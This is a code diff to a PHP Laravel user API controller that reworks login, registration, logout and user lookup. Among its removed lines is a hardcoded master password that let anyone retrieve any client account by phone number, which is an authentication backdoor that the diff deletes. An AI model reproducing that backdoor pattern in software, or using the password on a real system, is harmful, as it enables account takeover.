@@ -52,28 +52,21 @@ class UserAPIController extends Controller
             'phone_number' => ['required', new PhoneNumber],
             'password' => 'required',
         ]);
-
-        if ($request->password == '__@Sabek@customer') {
-            $u = User::where('phone_number', $request->phone_number)->whereHas("roles", function ($q) {
-                $q->where("name", "client");
-            })->first();
-            if ($u) {
-                return $this->sendResponse($u, 'User retrieved successfully');
-            }
-        }
-
-        if (auth()->attempt(['phone_number' => $request->input('phone_number'), 'password' => $request->input('password')])) {
+        if ($token =  auth()->attempt(['phone_number' => $request->input('phone_number'), 'password' => $request->input('password')])) {
             // Authentication passed...
             $user = auth()->user();
             if (!$user->hasRole('client')) {
                 return $this->sendError('User not client', 401);
             }
-
             if ($request->has('device_token')) {
-                //save decvice token on table
-                $user->deviceTokens()->firstOrCreate(['token' => $request->input('device_token')]);
+                $user->device_token = $request->device_token;
             }
-            return $this->sendResponse($user, 'User retrieved successfully');
+            $user->save();
+            return response()->json([
+                'token' => $token,
+                'user' => $user,
+            ]);
+            //return $this->sendResponse($user, 'User retrieved successfully');
         }
         return $this->sendError(trans('auth.failed'), 422);
     }
@@ -160,7 +153,7 @@ class UserAPIController extends Controller
             $user->phone_number =    $verfication->phone;
             $user->email = $request->input('email');
             $user->password = Hash::make($request->input('password'));
-            $user->api_token = str_random(60);
+            //$user->api_token = str_random(60);
             $user->save();
             $verfication->delete();
 
@@ -210,7 +203,7 @@ class UserAPIController extends Controller
         $user->phone_number = $request->input('phone_number'); // $verfication->phone;
         $user->email = $request->email ?? "$request->phone_number." . time();
         $user->password = Hash::make($request->input('password'));
-        $user->api_token = str_random(60);
+        //$user->api_token = str_random(60);
         $user->save();
         //$verfication->delete();
 
@@ -227,30 +220,16 @@ class UserAPIController extends Controller
         return $this->sendResponse($user, 'User retrieved successfully');
     }
 
+
     function logout(Request $request)
     {
-        try {
-            $user = auth()->user();
-            if ($request->has('device_token')) {
-                $user->deviceTokens()->where('token', $request->input('device_token'))->delete();
-            }
-            // logout user
-            //auth()->logout();
-            return $this->sendResponse($user->name, 'User logout successfully');
-        } catch (\Exception $e) {
-            $this->sendError($e->getMessage(), 401);
-        }
+        $user = auth()->user();
+        return $this->sendResponse($user->name, 'User logout successfully');
     }
 
     function user(Request $request)
     {
-        $user = $this->userRepository->findByField('api_token', $request->input('api_token'))->first();
-
-        if (!$user) {
-            return $this->sendError('User not found', 401);
-        }
-
-        return $this->sendResponse($user, 'User retrieved successfully');
+        return $this->sendResponse(auth()->user(), 'User retrieved successfully');
     }
 
     function settings(Request $request)
